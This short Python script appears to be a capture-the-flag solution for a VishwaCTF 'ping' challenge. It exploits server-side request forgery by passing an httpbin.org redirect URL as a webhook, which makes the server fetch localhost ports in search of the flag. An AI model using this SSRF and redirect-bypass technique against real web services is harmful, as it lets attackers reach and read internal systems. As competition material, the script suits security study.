#!/usr/bin/env python3
import requests

BASE = "https://ping.vishwactf.com"

# Scan common ports
ports = [80, 443, 3000, 4000, 5000, 8000, 8080, 8888, 9000, 3001, 5001, 8001, 8081]

for port in ports:
    url = f"https://httpbin.org/redirect-to?url=http://localhost:{port}/flag"
    print(f"[*] Port {port}...", end=" ")
    r = requests.post(f"{BASE}/api/ping", json={"webhook_url": url})
    res = r.json()
    
    if res.get('success'):
        print(f"SUCCESS!")
        preview = res.get('preview', '')
        print(f"    Preview: {preview[:500]}")
        if "VishwaCTF{" in preview:
            print(f"\n[!!!] FLAG: {preview}")
            break
    elif "ECONNREFUSED" in str(res.get('error', '')):
        print("refused")
    else:
        print(f"{res.get('error', 'unknown')[:50]}")
